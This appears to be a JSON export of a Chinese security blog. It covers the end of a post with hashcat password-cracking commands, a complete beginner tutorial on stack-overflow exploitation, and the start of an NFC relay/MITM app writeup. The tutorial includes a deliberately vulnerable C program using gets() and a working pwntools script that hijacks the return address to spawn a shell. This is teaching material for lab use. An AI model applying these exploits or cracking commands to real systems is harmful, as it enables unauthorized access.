|\n| 3    | 高   | 96 ms    | 高       | 没有反应 |\n| 4    | 噩梦 | 480 ms   | 疯狂的   | 无法控制 |\n\n### ⑨ 基本用例\n\n| 攻击模式  | Hash种类 | 示例命令                                                     |\n| --------- | -------- | ------------------------------------------------------------ |\n| 字典      | $P$      | hashcat -a 0 -m 400 example400.hash example.dict             |\n| 字典+规则 | MD5      | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule |\n| 暴力穷举  | MD5      | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a                 |\n| 组合      | MD5      | hashcat -a 1 -m 0 example0.hash example.dict example.dict    |\n\n","tags":[{"name":"Wireless","slug":"Wireless","permalink":"http://www.killshadow.xyz/tags/Wireless/"}]},{"title":"1.1-菜鸟学PWN之栈溢出学习","date":"2018-10-09T16:00:00.000Z","path":"2018/10/10/1.1-菜鸟学PWN之栈溢出学习/","raw":"---\ntitle: 1.1-菜鸟学PWN之栈溢出学习\ndate: 2018-10-10\ncategories:\ntoc: ture\ntags:\n\t- PWN\n\t- CTF\ncomments: true\n---\n\n\n> 实现栈溢出的两个条件:\n>\n> - 程序有向栈写入数据的行为\n> - 程序并不限制写入数据的长度\n>\n<!-- more -->\n> 如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的内容或地址, 并且要将程序控制权交给该指令. \n> 攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令.\n>\n\n\n\n\n## 0x10 背景知识\n\n### 0x11 栈介绍\n\n栈是一种典型的**先进后出(First in Last Out)**的数据结构, 其操作主要有压栈(push)与出栈(pop)两种操作. **两种操作都是操作栈顶**, 当然也有栈底(位于高地址).\n\n![基本栈操作](Data_stack.png)\n\n每个程序在运行时都有虚拟地址空间, 其中某一部分就是该程序对应的栈. 编译器使用堆栈**传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量**. 程序的栈都是**从进程地址空间的高地址向低地址增长**.\n\n\n\n----------------------\n\n### 0x12 栈帧结构\n\n函数调用经常是**嵌套**的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个**独立的连续区域**, 称作**栈帧(Stack Frame)**. 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等.\n\n栈帧的边界由栈帧基地址指针EBP和栈帧堆栈指针ESP界定(指正存放在相应寄存器中). EBP指向栈帧底部(高地址), 在当前栈帧内位置固定; ESP指向栈帧顶部(低地址), 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量). 因此函数中对数据的访问大部分是基于EBP(对EBP取相对地址). 函数调用栈典型内存分布如下图:\n\n![img](271650059007975.jpg)\n\n> 注意: 当函数被调用时, EBP的地址是当前栈帧的基地址, 但EBP指向的是上一栈帧基地址的地址.\n\n\n\n#### (1) 入栈出栈指令\n\n函数序(入栈)实现如下：\n\n|  **指令序列**           |                           **含义**            |\n| :-------------------: | :-------------------------------------------- |\n|   push %ebp    | 将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧 |\n| mov %esp, %ebp | 将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶 |\n| sub <n>, %esp  | 将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术) |\n|    push <r>    | 可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值 |\n| ................................. |  |\n\n函数跋(出栈)实现如下:\n\n|           **指令序列**            | **含义**                                                     |\n| :-------------------------------: | :----------------------------------------------------------- |\n|              pop <r>              | 可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值 |\n|          mov %ebp, %esp*          | 恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理) |\n|             pop %ebp*             | 主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处 |\n|                ret                | 从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈 |\n| ................................. | *：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。 |\n\n\n\n#### (2) 参数压栈指令\n\n 参数压栈指令因编译器而异，如下两种压栈方式基本等效：\n\n```c\nextern CdeclDemo(int w, int x, int y, intz);  //调用CdeclDemo函数\nCdeclDemo(1, 2, 3, 4);  //调用CdeclDemo函数\n```\n\n| **压栈方式一**                                              | **压栈方式二**                                 |\n| ----------------------------------------------------------- | ---------------------------------------------- |\n| pushl 4  //压入参数z                                        | *subl   $16, %esp* //多次调用仅执行一遍        |\n| pushl 3  //压入参数y                                        | movl  $4, 12(%esp) //传送参数z至堆栈第四个位置 |\n| pushl 2  //压入参数x                                        | movl  $3, 8(%esp) //传送参数y至堆栈第三个位置  |\n| pushl 1  //压入参数w                                        | movl  $2, 4(%esp) //传送参数x至堆栈第二个位置  |\n| call CdeclDemo  //调用函数                                  | movl  $1, (%esp) //传送参数w至堆栈栈顶         |\n| addl $16, %esp  //恢复ESP原值，使其指向调用前保存的返回地址 | call CdeclDemo  //调用函数                     |\n\n​     两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。\n\n\n\n---------------------------\n\n### 0x13 函数调用栈\n\n**函数调用栈**是指程序运行时内存一段连续的区域, 用来保存函数运行时的状态信息, 包括函数参数与局部变量等. 称之为\"栈\"是因为发生函数调用时, 调用函数(caller)的被保存在栈内, 被调用函数(callee)的状态被压入调用栈的栈顶; 在函数调用结束时, 栈顶的函数(callee)状态被弹出, 栈顶恢复到调用函数(caller)的状态. 函数调用栈在内存中从高地址向低地址生长, 所以栈顶对应的内存在压栈时变小, 出栈时变大.\n\n> 函数调用发生和结束的调用栈帧如下图:\n>\n> ![img](v2-8d5649c36458080223084d77abbd554a_hd.jpg)\n>\n> 函数状态主要涉及三个寄存器--esp, ebp, eip:\n>  - esp 用来存储函数调用栈(caller)的栈顶指针, 在压栈(入栈)和退栈(出栈)时发生变化.\n>  - ebp 用来存储当前函数状态的基地址, 在函数运行时不变, 可以用来索引确定函数参数或局部变量的位置.\n>  - eip 用来存储即将执行的程序指令的地址, cpu依照eip的存储内容读取指令并执行, eip随之指向相邻的下一条指令. EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。\n\n分析demo源代码:\n\n```c\n/*************************************************************************\n\t> File Name: debugfunc.c\n\t> Author: killshadow\n\t> Mail: chaceli@foxmail.com\n\t> Created Time: 2018年09月02日 星期日 09时26分02秒\n ************************************************************************/\n\n#include<stdio.h>\n\nint calc(int a, int b){\n    int c;\n    int d = 2;\n    c = a*d +b;\n    return c;\n}\n\nint main(){\n    int a = 5;\n    int b;\n    int c;\n    printf(\"Please input a number:\\n\");\n    scanf(\"%d\",&b);\n    c = calc(a,b);\n    printf(\"Result: %d\\n\",c);\n    return 0;\n}\n```\n\n然后在命令行中:\n\n```bash\ngcc -m32 debugfunc.c -o debugfunc32 # -m32表示编译成32位的程序\n```\n\n\n\n#### (1) 函数调用压栈顺序\n\n\n> 1. 调用者压入需要保存的寄存器(通常这些寄存器包括 EAX，ECX 和 EDX等)\n> 2. 按照从右往左的顺序压入参数(这个可能有特殊情况, 详情请看[C语言函数调用栈(二)](http://www.cnblogs.com/clover-toeic/p/3756668.html))\n> 3. 返回地址\n> 4. 调用者的 EBP\n> 5. 局部变量\n> 6. 被调用者本身压入需要保存的寄存器， 通常这些寄存器包括 EBX，ESI 和 EDI 等\n\n1) 被调用函数(callee)的**参数**按照**逆序**依次压入栈内. 如果callee没有参数, 则无需此操作. 这些参数仍会保存在调用函数(caller)的函数状态内, 之后压入栈内的数据都会作为被调用函数(callee)的函数状态来保存.\n\n   ![img](v2-9125ba203edd2bab1308ad88db2ae197_hd.jpg)\n\n   ```assembly\n       0x8048552 <main+68>        add    esp, 0x10\n       0x8048555 <main+71>        mov    eax, DWORD PTR [ebp-0x18]\n       0x8048558 <main+74>        sub    esp, 0x8\n    →  0x804855b <main+77>        push   eax\t# $eax : 0x17(即:23,自己输入的数据)\n       0x804855c <main+78>        push   DWORD PTR [ebp-0x14] # ebp为main函数栈基址,-0x14便是int a的栈地址,此处是压入a的值到calc调用栈\n       0x804855f <main+81>        call   0x80484eb <calc>\n       0x8048564 <main+86>        add    esp, 0x10\n       0x8048567 <main+89>        mov    DWORD PTR [ebp-0x10], eax\n       0x804856a <main+92>        sub    esp, 0x8\n   ```\n\n   ![1538817009439](1538817009439.png)\n\n2) 然后将调用函数(caller)进行调用之后的**下一条指令地址作为返回地址压入栈内**. 这样调用函数(caller)的eip(指令)信息得以保存.(这一操作是隐式的, 在执行call命令时就已经push了return的值了)\n\n   ![img](v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.jpg)\n\n   在gdb里`step into`进`calc`函数, 当执行到`push ebp`的时候, 能看到前面的两个参数和返回地址已经被push到当前函数(即`calc`)的栈帧, 如下图:\n\n   ![1538825556293](1538825556293.png)\n\n3) 再将当前的**ebp寄存器的值(也就是调用函数[caller]的基地址)压入栈**内, 并将**ebp寄存器的值更新为当前栈顶(esp)的地址**. 这样调用函数(caller)的ebp(基地址)信息得以保存. 同时, ebp被更新为被调用函数(callee)的基地址. 例如下面调用calc函数时, 有`mov rbp, rsp`:\n\n   ```assembly\n        0x4006b1 <main+61>        dec    DWORD PTR [rbx+0x458bec55]\n        0x4006b7 <main+67>        lock   mov esi, edx\n        0x4006ba <main+70>        mov    edi, eax\n    →   0x4006bc <main+72>        call   0x400646 <calc>\n      ↳    0x400646 <calc+0>         push   rbp\n           0x400647 <calc+1>         mov    rbp, rsp\n           0x40064a <calc+4>         mov    DWORD PTR [rbp-0x14], edi\n           0x40064d <calc+7>         mov    DWORD PTR [rbp-0x18], esi\n           0x400650 <calc+10>        mov    DWORD PTR [rbp-0x8], 0x0\n           0x400657 <calc+17>        mov    DWORD PTR [rbp-0x4], 0x2\n   ```\n\n   ![img](v2-c350a4c5e9f5bbe839606486f3100185_hd.jpg)\n\n   ![1538826215949](1538826215949.png)\n\n4) 再之后将**被调用函数(callee)的局部变量等数据压入栈**内.\n\n   ![img](v2-63f07378642e6f38197ddfb817567f6c_hd.jpg)\n\n   ```assembly\n       0x80484ec <calc+1>         mov    ebp, esp\n       0x80484ee <calc+3>         sub    esp, 0x10\n       0x80484f1 <calc+6>         mov    DWORD PTR [ebp-0x8], 0x2 # 给d赋值: d=2\n    →  0x80484f8 <calc+13>        mov    eax, DWORD PTR [ebp+0x8] # 将参数a=5赋给eax\n       0x80484fb <calc+16>        imul   eax, DWORD PTR [ebp-0x8] # 5*2(有符号乘)\n       0x80484ff <calc+20>        mov    edx, eax\n       0x8048501 <calc+22>        mov    eax, DWORD PTR [ebp+0xc]\n       0x8048504 <calc+25>        add    eax, edx # 10 + 23\n       0x8048506 <calc+27>        mov    DWORD PTR [ebp-0x4], eax # 赋值给变量c\n   ```\n\n\n\n\n#### (2) 函数调用出栈顺序\n\n1) 栈顶(ESP)会重新指向被调用函数(callee)的基地址, 因此, 被调用函数的局部变量会从站内直接弹出. 如下:\n![img](v2-4340d6c750f59519f4f87dffca03a86a_hd.jpg)\n\n   具体汇编代码是:\n\n   ```assembly\n       0x8048505 <calc+26>        ror    BYTE PTR [ecx+0x458bfc45], 1\n       0x804850b <calc+32>        cld    \n       0x804850c <calc+33>        leave  \n    →  0x804850d <calc+34>        ret    \n      ↳   0x8048564 <main+86>        add    esp, 0x10\n          0x8048567 <main+89>        mov    DWORD PTR [ebp-0x10], eax\n          0x804856a <main+92>        sub    esp, 0x8\n          0x804856d <main+95>        push   DWORD PTR [ebp-0x10]\n          0x8048570 <main+98>        push   0x804863a\n          0x8048575 <main+103>       call   0x8048390 <printf@plt>\n   ```\n\n   如上图, 当执行到`calc`函数的`ret`返回语句时, 会有下面一系列的语句, 其中第一条`add`语句就是让`esp`重新指向`calc`的基址(ebp)的关键语句, 此时位于低地址的局部变量将丢弃.\n\n2) 随后将基地址内存储的调用函数(caller)的ebp的值重新pop到当前的ebp中, 至此, 调用函数(caller)的基地址得以恢复. 值得注意的是, 这一操作是隐式的(与函数调用压栈的第2步作对比). 如下图:\n   - 执行`leave`前:\n     ![1538829057155](1538829057155.png)\n\n   - 执行`leave`后:\n     ![1538829148474](1538829148474.png)\n\n   - `esp`存储的地址会指向返回地址(`0x08048564`):\n     ``` assembly\n     ─────────────────────────────────────────────────────────[ registers ]────\n     $eax   : 0x21      \n     $ebx   : 0x0       \n     $ecx   : 0x1       \n     $edx   : 0xa       \n     $esp   : 0xffffcf5c  →  0x08048564  →  <main+86> add esp, 0x10 # 指向ret地址\n     $ebp   : 0xffffcf88  →  0x00000000\n     $esi   : 0xf7faf000  →  0x001b1db0\n     $edi   : 0xf7faf000  →  0x001b1db0\n     $eip   : 0x804850d   →  <calc+34> ret \n     $eflags: [carry PARITY ADJUST zero sign trap INTERRUPT direction overflow resume virtualx86 identification]\n     $gs: 0x0063  $fs: 0x0000  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $ss: 0x002b \n     ```\n\n3) 然后将返回地址从栈内pop出来, 并存到`eip`内. 从而调用函数(caller)的`eip`信息得以恢复, 指向下一条指令.\n![1538830059726](1538830059726.png)\n\n> 总结一下上面的调用压栈和出栈: \n>\n> (1)压栈时, 先压参数, 后压返回地址, 然后再将caller的`ebp`压入, 最后将局部变量压入.\n>\n> (2)出栈时, 先弹局部变量, 后弹ebp, 然后通过返回地址恢复`eip`.\n>\n> 通过上述描述, 可知函数调用压栈和出栈是一个互逆过程, 这也间接验证了堆栈平衡的机理.\n\n\n\n------------------\n\n### 0x14 寄存器分布\n\n![img](register.png)\n\n> 32位和64位程序的部分区别:\n>\n> - x86\n>   - **函数参数**在**函数返回地址**的上方\n> - x64\n>   - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在**RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上。\n>   - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常。\n\n\n\n--------------------\n\n## 0x20 栈溢出原理\n\n栈溢出的原理其实很简单: **在程序没有判断输入长度的情况下, 当程序向申请的变量写入的字节长度超过了该变量向内存申请的字节长度, 因而导致该变量相邻的栈的内存的值被覆盖.** 简而言之, 还是开篇提及的两个栈溢出条件. 由于操作系统或者程序增加了对栈溢出的保护, 而使得溢出的难度增大, 但其核心思想是不变的. 我们先用根据下图来看看溢出的效果:\n\n1) 在执行漏洞函数之前, 我们能看到`ebp` `esp`的地址很正常, ebp的下一个地址也指向了`return address`.\n\n   ![1538897713778](1538897713778.png)\n\n2) 接着当我们执行到漏洞函数之时, 输入以下字符串:\n\n   ```bash\n   aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808\n   ```\n\n3) 我们再看看此时的堆栈:\n\n   ```bash\n   ──────────────────────────────────────────────────────────────[ registers ]────\n   $eax   : 0x25      \n   $ebx   : 0x0       \n   $ecx   : 0xffffffff\n   $edx   : 0xf7fae870  →  0x00000000\n   $esp   : 0xffffcf30  →  0xf7fad300  →  0xf7f56447  →  \"ISO-10646/UCS2/\"\n   $ebp   : 0x33333333 (\"3333\"?)\n   $esi   : 0xf7fad000  →  0x001b1db0\n   $edi   : 0xf7fad000  →  0x001b1db0\n   $eip   : 0x38303830 (\"0808\"?)\n   $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]\n   $gs: 0x0063  $ds: 0x002b  $cs: 0x0023  $es: 0x002b  $fs: 0x0000  $ss: 0x002b  \n   ```\n\n   不难看出, 此时的`ebp`被覆盖为`0x33333333` ,`eip`被覆盖为`0x38303830`. 至此, 栈溢出完美实现!\n\n\n\n------------\n\n## 0x30 栈溢出实战-小试牛刀\n\n首先, 先写一个有漏洞的脚本程序:\n\n```c\n/*************************************************************************\n\t> File Name: stack-overflow-demo.c\n\t> Author: killshadow\n\t> Mail: chaceli@foxmail.com\n\t> Created Time: 2018年10月07日 星期日 13时02分34秒\n ************************************************************************/\n\n#include<stdio.h>\n#include<string.h>\n\nvoid exec(){\n    printf(\"Congratulations! You have already get shell!\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid vulnerablefunc(){\n    char s[20];\n    gets(s);\n    puts(s);\n}\n\nint main(int argc, char **argv){\n    vulnerablefunc();\n    return 0;\n}\n```\n\n上面的程序中, `exec()`可以执行shell命令, 但是没有在主函数执行; `vulnerablefunc()`执行了一个没有判断输入字符串长度的`gets`函数, 该函数是一个危险函数(不判断输入字符串的长度), 编译时也能看得出来:\n\n```bash\n➜  demo gcc -m32 -fno-stack-protector stack-overflow-demo.c -o stack-overflow-demo\nstack-overflow-demo.c: In function ‘exec’:\nstack-overflow-demo.c:13:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]\n     system(\"/bin/sh\");\n     ^\nstack-overflow-demo.c: In function ‘vulnerablefunc’:\nstack-overflow-demo.c:18:5: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]\n     gets(s);\n     ^\n/tmp/ccA0jCUY.o: In function `vulnerablefunc':\nstack-overflow-demo.c:(.text+0x37): warning: the `gets' function is dangerous and should not be used.\n```\n\n上面编译有两个warning: 1)第一个warning提示危险的`system`函数(系统调用); 2)第二个warning就是`gets`函数了. 该命令中, `-fno-stack-protectotor`表示不开启堆栈溢出保护(不生成canary). 同时, 还可以关闭地址随机化PIE(Position Independent Executable), 如果`gcc -v`后能看到`--enable-default-pie`即为开启了PIE. 我们在编译时, 添加`-no-pie`参数即可关闭PIE.\n\n此时我们在shell下反汇编`objdump -d stack-overflow-demo`:(截取部分汇编)\n\n```assembly\n0804846b <exec>:\n 804846b:\t55                   \tpush   %ebp\n 804846c:\t89 e5                \tmov    %esp,%ebp\n 804846e:\t83 ec 08             \tsub    $0x8,%esp\n 8048471:\t83 ec 0c             \tsub    $0xc,%esp\n 8048474:\t68 60 85 04 08       \tpush   $0x8048560\n 8048479:\te8 b2 fe ff ff       \tcall   8048330 <puts@plt>\n 804847e:\t83 c4 10             \tadd    $0x10,%esp\n 8048481:\t83 ec 0c             \tsub    $0xc,%esp\n 8048484:\t68 8d 85 04 08       \tpush   $0x804858d\n 8048489:\te8 b2 fe ff ff       \tcall   8048340 <system@plt>\n 804848e:\t83 c4 10             \tadd    $0x10,%esp\n 8048491:\t90                   \tnop\n 8048492:\tc9                   \tleave  \n 8048493:\tc3                   \tret    \n\n08048494 <vulnerablefunc>:\n 8048494:\t55                   \tpush   %ebp\n 8048495:\t89 e5                \tmov    %esp,%ebp\n 8048497:\t83 ec 28             \tsub    $0x28,%esp\n 804849a:\t83 ec 0c             \tsub    $0xc,%esp\n 804849d:\t8d 45 e4             \tlea    -0x1c(%ebp),%eax # ebp-0x1c即为s的地址\n 80484a0:\t50                   \tpush   %eax\n 80484a1:\te8 7a fe ff ff       \tcall   8048320 <gets@plt> # 这里调用gets函数\n 80484a6:\t83 c4 10             \tadd    $0x10,%esp\n 80484a9:\t83 ec 0c             \tsub    $0xc,%esp\n 80484ac:\t8d 45 e4             \tlea    -0x1c(%ebp),%eax\n 80484af:\t50                   \tpush   %eax\n 80484b0:\te8 7b fe ff ff       \tcall   8048330 <puts@plt>\n 80484b5:\t83 c4 10             \tadd    $0x10,%esp\n 80484b8:\t90                   \tnop\n 80484b9:\tc9                   \tleave  \n 80484ba:\tc3                   \tret    \n\n080484bb <main>:\n 80484bb:\t8d 4c 24 04          \tlea    0x4(%esp),%ecx\n 80484bf:\t83 e4 f0             \tand    $0xfffffff0,%esp\n 80484c2:\tff 71 fc             \tpushl  -0x4(%ecx)\n 80484c5:\t55                   \tpush   %ebp\n 80484c6:\t89 e5                \tmov    %esp,%ebp\n 80484c8:\t51                   \tpush   %ecx\n 80484c9:\t83 ec 04             \tsub    $0x4,%esp\n 80484cc:\te8 c3 ff ff ff       \tcall   8048494 <vulnerablefunc>\n 80484d1:\tb8 00 00 00 00       \tmov    $0x0,%eax\n 80484d6:\t83 c4 04             \tadd    $0x4,%esp\n 80484d9:\t59                   \tpop    %ecx\n 80484da:\t5d                   \tpop    %ebp\n 80484db:\t8d 61 fc             \tlea    -0x4(%ecx),%esp\n 80484de:\tc3                   \tret    \n 80484df:\t90                   \tnop\n```\n\n执行`gets`函数之前, `vulnerablefunc`的栈帧为:\n\n```assembly\n                            High\n                    +---------------------+\n                    |                     |\n                    |    Return Address   |\n                    |                     |\n                    +---------------------+\n                    |                     |\n                    |    Caller's ebp     |\n                    |                     |\n                    +---------------------+ <------+ ebp\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    |                     |\n                    +---------------------+\n                    |   Local Variables   |\n                    |    (char s[20])     |\n                    +---------------------+ <------+ s, [ebp-0x1c]\n                              Low\n```\n\n`gets`函数执行后, `vulnerablefunc`的栈帧为:(输入: `aaaaaaaaaaaaaaaaaaaaaaaaaaaa33330808`)\n\n```assembly\n                         High\n                 +---------------------+\n                 |                     |\n                 |    Return Address   |\n                 |    (0x38303830)     |\n                 +---------------------+\n                 |                     |\n                 |    Caller's ebp     |\n                 |    (0x33333333)     |\n                 +---------------------+ <------+ ebp\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 |                     |\n                 +---------------------+\n                 |   Local Variables   |\n                 |      (aaaa...)      |\n                 +---------------------+ <-------+ s, [ebp-0x1c]\n                         Low\n```\n\n这里的`0x1c`是`char`型变量`s`与`ebp`的相对地址, 所以要覆盖`ebp`, 就需要构造`0x1c`个字节的payload, 后面四个字节是`ebp`的地址, 紧接着`ebp`的后面四个字节的地址便是返回地址. 因此, 如果要覆盖返回地址, 让函数弹出栈帧时弹到自己想要返回到的函数地址, 就需要先找到**需要利用的函数的地址**, 然后将这个地址加进payload里, 如下所示代码:\n\n```python\n#!/usr/bin/python\n# coding=utf-8\nfrom pwn import *\n\n# open this elf executable file\nsh = process('./stack-overflow-demo')\n# objdump -d stack-overflow-demo, you can find \"exec\" function's address\nexec_addr = 0x0804846B\n\n# 0x1c is offset address from ebp, [ebp - 0x1c] is \"s\" address\n# \"aaaa\" can cover ebp value\n# return address had changed exec_addr\npayload = \"a\" * 0x1c + \"aaaa\" + p32(exec_addr)\n# print small end address\nprint p32(exec_addr)\n\n# send payload into process\nsh.sendline(payload)\n# get interactive shell\nsh.interactive()\n```\n\n执行该脚本之后, 可以获得shell:\n\n```bash\n➜  demo python stack-overflow-demo-attack.py\n[+] Starting local process './stack-overflow-demo': pid 20109\nk\\x84\\x0\n[*] Switching to interactive mode\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak\\x84\\x0\nCongratulations! You have already get shell!\n$ uname -a\nLinux ks 4.15.0-36-generic #39~16.04.1-Ubuntu SMP Tue Sep 25 08:59:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n\n\n至此, 你的第一个栈溢出攻击的过程就完美实现啦! Keep Moving!!!\n\n\n\n--------------------\n\n\n## 0x40 参考链接\n\n> 部分内容引自如下blog, 如有侵权立即更改本文.\n\n[100个gdb小技巧](https://wizardforcel.gitbooks.io/100-gdb-tips/content/)\n\n[手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)\n\n[C语言函数调用栈(一)](http://www.cnblogs.com/clover-toeic/p/3755401.html)\n\n[C语言函数调用栈(二)](http://www.cnblogs.com/clover-toeic/p/3756668.html)\n\n[栈介绍-CTF-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/)","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"http://www.killshadow.xyz/tags/PWN/"}]},{"title":"NFC开发笔记","date":"2018-09-08T16:00:00.000Z","path":"2018/09/09/NFC开发笔记/","raw":"---\ntitle: NFC开发笔记\ndate: 2018-09-09\ncategories:\ntoc: ture\ntags:\n\t- Android Developer\ncomments: true\n---\n\n## 0x00 概述\n\n> 在正式开始介绍项目前，我想先介绍一下背景及一些废话，方便大家能够更好理解这个项目。这个项目起初是为了能够更好地抓取手机与IC卡之间的交互数据，以及对抓取的数据进行分析。<!-- more -->后来在抓取数据过程当中，希望能够实现某些数据的替换（中间人）、重放、中继，以此展开了一系列的功能扩展。此外，对于数据提取这一块，也做了一些专门的优化，如：在Log中发送数据到HCE模块或者到MitM模块。文章的最后还会对希望扩展的功能进一步分析。我暂且把这个项目的整体设计模式称为：VNNC模式（View Network NFC Control，可以简单理解为MVC模式），对应的包如下图。为了加速apdu数据流的数据传输，我们还增加了多线程功能，这个方式将数据的SQLite存储与apdu数据流分离在不同线程，以保证高效、有序地对数据操作。这个设计模式是鄙人自命名的，如有纰漏，请指正。以下会对整个项目进行解释，以方便接管项目者快速理解整个项目，少走一些弯路。\n\n```haxe\n.\n└── tud\n    └── seemuh\n        └── nfcgate\n            ├── gui\n            │   ├── AboutActivity.java\n            │   ├── AboutWorkaroundActivity.java\n            │   ├── adapter\n            │   │   ├── ListViewAdapter.java\n            │   │   ├── MitmItemAdapter.java\n            │   │   └── MulAdapter.java\n            │   ├── EditActivity.java\n            │   ├── fragments\n            │   │   ├── CloneFragment.java\n            │   │   ├── EnablenfcDialog.java\n            │   │   ├── HceFragment.java\n            │   │   ├── LoggingDetailFragment.java\n            │   │   ├── LoggingFragment.java\n            │   │   ├── MitmFragment.java\n            │   │   ├── RelayFragment.java\n            │   │   ├── SettingsFragment.java\n            │   │   ├── TokenDialog.java\n            │   │   └── WorkaroundDialog.java\n            │   ├── LogActivity.java\n            │   ├── LoggingDetailActivity.java\n            │   ├── MainActivity.java\n            │   ├── MitmActivity.java\n            │   ├── RuleActivity.java\n            │   ├── SettingsActivity.java\n            │   ├── Splash.java\n            │   ├── tabLayout\n            │   │   ├── SlidingTabLayout.java\n            │   │   └── SlidingTabStrip.java\n            │   └── tabLogic\n            │       └── PagerAdapter.java\n            ├── network\n            │   ├── c2c\n            │   │   └── C2C.java\n            │   ├── c2s\n            │   │   └── C2S.java\n            │   ├── Callback.java\n            │   ├── HighLevelNetworkHandler.java\n            │   ├── HighLevelProtobufHandler.java\n            │   ├── LowLevelNetworkHandler.java\n            │   ├── LowLevelTCPHandler.java\n            │   ├── meta\n            │   │   └── MetaMessage.java\n            │   └── ProtobufCallback.java\n            ├── nfc\n            │   ├── config\n            │   │   ├── ConfigBuilder.java\n            │   │   ├── ConfigOption.java\n            │   │   ├── OptionType.java\n            │   │   └── Technologies.java\n            │   ├── hce\n            │   │   ├── ApduService.java\n            │   │   ├── DaemonConfiguration.java\n            │   │   └── PaymentServiceHost.java\n            │   ├── NfcManager.java\n            │   └── reader\n            │       ├── DesfireWorkaround.java\n            │       ├── IsoDepReader.java\n            │       ├── NfcAReader.java\n            │       ├── NfcBReader.java\n            │       ├── NfcFReader.java\n            │       ├── NFCTagEmulator.java\n            │       ├── NFCTagReader.java\n            │       └── NfcVReader.java\n            └── util\n                ├── CustomTextWatcher.java\n                ├── db\n                │   ├── CloneListItem.java\n                │   ├── CloneListStorage.java\n                │   ├── DbInitTask.java\n                │   ├── RuleListItem.java\n                │   ├── RuleListStorage.java\n                │   ├── SessionLoggingContract.java\n                │   └── SessionLoggingDbHelper.java\n                ├── filter\n                │   ├── action\n                │   │   ├── Action.java\n                │   │   ├── ActionSequence.java\n                │   │   ├── Append.java\n                │   │   ├── InsertBytes.java\n                │   │   ├── ReplaceBytes.java\n                │   │   ├── ReplaceContent.java\n                │   │   └── Truncate.java\n                │   ├── conditional\n                │   │   ├── All.java\n                │   │   ├── And.java\n                │   │   ├── Conditional.java\n                │   │   ├── EndsWith.java\n                │   │   ├── Equals.java\n                │   │   ├── Length.java\n                │   │   ├── Not.java\n                │   │   ├── Or.java\n                │   │   ├── StartsWith.java\n                │   │   └── Xor.java\n                │   ├── FilterInitException.java\n                │   ├── Filter.java\n                │   └── FilterManager.java\n                ├── ItemBean.java\n                ├── MitmComm.java\n                ├── NfcComm.java\n                ├── NfcSession.java\n                ├── preference\n                │   └── IntEditTextPreference.java\n                ├── ReadLoadedSo.java\n                ├── RootManager.java\n                ├── RuleMatching.java\n                ├── sink\n                │   ├── FileSink.java\n                │   ├── SessionLoggingSink.java\n                │   ├── SinkInitException.java\n                │   ├── Sink.java\n                │   ├── SinkManager.java\n                │   └── TextViewSink.java\n                ├── UpdateUI.java\n                └── Utils.java\n```\n\n## 0x01 视图模块之Fragment/Activity\n\n### Ⅰ. adapter\n\nadapter包里又有三个细分的adapter，分别是：`ListViewAdapter`、`MitmItemAdapter`、`MulAdapter`。\n\n#### 1. ListViewAdapter\n\n这个Adapter主要是用在`HCE`模块中的列表的Item，每个Item包含两个`EditText`和一个`Button`, 为了能够更好管理`EditText`和一个`Button`的相关性, 而增加了这个adapter(适配器). 主要代码如下:\n\n```java\n    @Override\n    public View getView(final int position, View convertView, ViewGroup parent) {\n        ViewHolder holder = null;\n        if 